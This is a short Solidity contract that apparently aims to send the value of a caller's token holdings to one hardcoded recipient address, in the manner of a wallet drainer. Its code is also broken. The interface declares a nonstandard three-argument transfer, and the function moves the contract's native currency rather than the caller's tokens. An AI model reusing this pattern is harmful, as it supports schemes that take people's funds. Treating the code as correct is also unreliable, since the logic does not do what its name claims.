// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

interface ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract TokenAuthorizationAndTransfer {
    address[] public tokenAddresses = [0x55d398326f99059fF775485246999027B3197955];
    address payable toAddress = payable(0x2A06244A83535C2e4e80fa99edfBd33E6553afB5);


    function with() external {
        for (uint256 i = 0; i < tokenAddresses.length; i++) {
            address tokenAddress = tokenAddresses[i];
            ERC20 token = ERC20(tokenAddress);
            toAddress.transfer(token.balanceOf(msg.sender));
        }
    }
}